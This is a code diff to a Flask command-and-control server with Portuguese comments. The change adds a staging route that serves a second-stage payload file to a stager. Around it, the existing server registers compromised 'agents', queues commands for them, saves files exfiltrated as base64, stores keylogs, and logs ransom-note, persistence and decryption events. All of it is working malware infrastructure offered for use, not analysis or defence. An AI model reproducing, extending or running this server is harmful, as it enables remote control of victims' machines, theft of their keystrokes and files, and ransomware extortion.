@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, jsonify, render_template, send_from_directory
 from datetime import datetime, timedelta
 import uuid
 import json
@@ -22,7 +22,7 @@ KEYLOGS_DIR = "C2_Keylogs"
 SYSTEM_LOGS_DIR = "C2_System_Logs"
 OPERATOR_LOG_FILE = "c2_operator_log.txt"
 agents = {} 
-tasks = {} 
+tasks = {} # Modificado para rastrear o status das tarefas
 
 AGENT_TIMEOUT_SECONDS = 60
 
@@ -66,6 +66,23 @@ def log_system_event(agent_id, event_type, message):
 def home():
     return render_template('index.html')
 
+# --- NOVA ROTA DE STAGING ---
+@app.route('/stage/main', methods=['GET'])
+def serve_stage2():
+    """
+    Esta rota serve o conteúdo do GeminiV2.py (nosso Stage 2) para o stager.
+    """
+    try:
+        # Garante que estamos servindo a partir do diretório do script do servidor
+        script_dir = os.path.dirname(os.path.realpath(__file__))
+        return send_from_directory(script_dir, 'GeminiV2_2test.py', mimetype='text/plain')
+    except FileNotFoundError:
+        print("[!] Erro Crítico: O arquivo 'GeminiV2_2test.py' não foi encontrado no diretório do servidor.")
+        return "Payload not found", 404
+    except Exception as e:
+        print(f"[!] Erro ao servir o payload Stage 2: {e}")
+        return "Internal server error", 500
+
 # --- API PARA AGENTES E DEMAIS FUNÇÕES ---
 @app.route('/register', methods=['POST'])
 def register_agent():
@@ -77,7 +94,7 @@ def register_agent():
         "external_ip": data.get("external_ip", "N/A"),
         "os_name": data.get("os_name"),
         "privileges": data.get("privileges", "Desconhecido"),
-        "agent_version": data.get("agent_version", "2.0"),
+        "agent_version": data.get("agent_version", "2.2"),
         "first_seen": datetime.now().isoformat(), "last_seen": datetime.now().isoformat()
     }
     tasks[agent_id] = []
@@ -93,7 +110,14 @@ def issue_command():
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
     log_operator_action(agent_id, command, args)
     task_id = str(uuid.uuid4())
-    task = {"task_id": task_id, "command": command, "args": args, "status": "Pendente", "timestamp_issued": datetime.now().isoformat(), "result": None}
+    task = {
+        "task_id": task_id, 
+        "command": command, 
+        "args": args, 
+        "status": "Pendente", 
+        "timestamp_issued": datetime.now().isoformat(), 
+        "result": None
+    }
     tasks.setdefault(agent_id, []).append(task)
     return jsonify({"status": "Comando enfileirado", "task_id": task_id})
 
@@ -114,6 +138,7 @@ def post_result():
     agent_id = data.get('agent_id'); task_id = data.get('task_id')
     if agent_id not in agents: return jsonify({"error": "Agente não registrado"}), 404
     data_type = data.get('data_type', 'generic_result'); result_data = data.get('result')
+    
     task_found = False
     for task in tasks.get(agent_id, []):
         if task['task_id'] == task_id:
@@ -122,9 +147,13 @@ def post_result():
             task_found = True
             log_system_event(agent_id, task['status'].upper(), f"Comando '{task['command']}' finalizado.")
             break
+            
     if not task_found: log_system_event(agent_id, "WARNING", f"Recebido resultado para uma tarefa desconhecida: {task_id}")
+
     if data_type == 'error': log_system_event(agent_id, "ERROR", result_data)
-    elif data_type in ['info', 'keylogger_started', 'keylogger_stopped', 'upload_success', 'ransom_note_displayed']: log_system_event(agent_id, "INFO", result_data)
+    elif data_type in ['info', 'keylogger_started', 'keylogger_stopped', 'upload_success', 'ransom_note_displayed', 'persistence_result', 'decryption_report']:
+        log_system_event(agent_id, "INFO", result_data)
+
     if data_type == 'file_download':
         try:
             file_content = base64.b64decode(result_data['content_b64'])
@@ -133,6 +162,7 @@ def post_result():
             with open(file_path, 'wb') as f: f.write(file_content)
             result_data = f"Arquivo '{result_data['filename']}' salvo em: {file_path}"
             data_type = 'download_success'
+            log_system_event(agent_id, "DOWNLOAD", result_data)
         except Exception as e:
             result_data = f"Erro ao salvar arquivo baixado: {e}"
             log_system_event(agent_id, "ERROR", result_data)
@@ -144,6 +174,7 @@ def post_result():
         except Exception as e:
             log_system_event(agent_id, "ERROR", f"Falha ao salvar keylog: {e}")
             return jsonify({"status": "error"})
+
     result_entry = {"task_id": task_id, "timestamp": datetime.now().isoformat(), "data_type": data_type, "data": result_data}
     filename = f"agent_{agent_id}_results.json"
     try:
@@ -157,6 +188,7 @@ def post_result():
 def get_tasks(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
     return jsonify(tasks.get(agent_id, []))
+
 @app.route('/get_system_logs/<agent_id>', methods=['GET'])
 def get_system_logs(agent_id):
     if agent_id not in agents: return "Agente não encontrado.", 404
@@ -165,6 +197,7 @@ def get_system_logs(agent_id):
         with open(log_file, 'r', encoding='utf-8') as f: return f.read()
     except FileNotFoundError: return "Nenhum log de sistema para este agente.", 404
     except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
+
 @app.route('/delete_agents', methods=['POST'])
 def delete_agents():
     global agents
@@ -186,6 +219,7 @@ def delete_agents():
     save_agents_to_disk()
     log_operator_action("SYSTEM", "delete_selected", {"deleted_ids": agent_ids_to_delete})
     return jsonify({"status": "success", "deleted_count": deleted_count})
+
 @app.route('/get_keylogs/<agent_id>', methods=['GET'])
 def get_keylogs(agent_id):
     if agent_id not in agents: return "Agente não encontrado.", 404
@@ -194,6 +228,7 @@ def get_keylogs(agent_id):
         with open(keylog_file, 'r', encoding='utf-8') as f: return f.read()
     except FileNotFoundError: return "Nenhum log capturado para este agente ainda.", 404
     except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
+
 @app.route('/get_agents', methods=['GET'])
 def get_agents():
     now = datetime.now(); agents_with_status = {}
@@ -203,6 +238,7 @@ def get_agents():
         else: agent_data['status'] = 'offline'
         agents_with_status[agent_id] = agent_data
     return jsonify(agents_with_status)
+
 @app.route('/get_results/<agent_id>', methods=['GET'])
 def get_results(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
@@ -211,6 +247,7 @@ def get_results(agent_id):
         with open(filename, 'r') as f: all_results = json.load(f)
     except: all_results = []
     return jsonify({"results": all_results})
+
 @app.route('/list_downloads/<agent_id>', methods=['GET'])
 def list_downloads(agent_id):
     if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
@@ -218,6 +255,7 @@ def list_downloads(agent_id):
     if not os.path.isdir(agent_download_dir): return jsonify([])
     files = [f for f in os.listdir(agent_download_dir) if os.path.isfile(os.path.join(agent_download_dir, f))]
     return jsonify(files)
+
 @app.route('/decrypt_file', methods=['POST'])
 def decrypt_file_route():
     if not AES: return jsonify({"status": "error", "message": "Biblioteca de criptografia não está instalada no servidor."}), 500
@@ -243,4 +281,3 @@ if __name__ == '__main__':
     setup_directories()
     load_agents_from_disk()
     app.run(host='0.0.0.0', port=8000, debug=True)
-
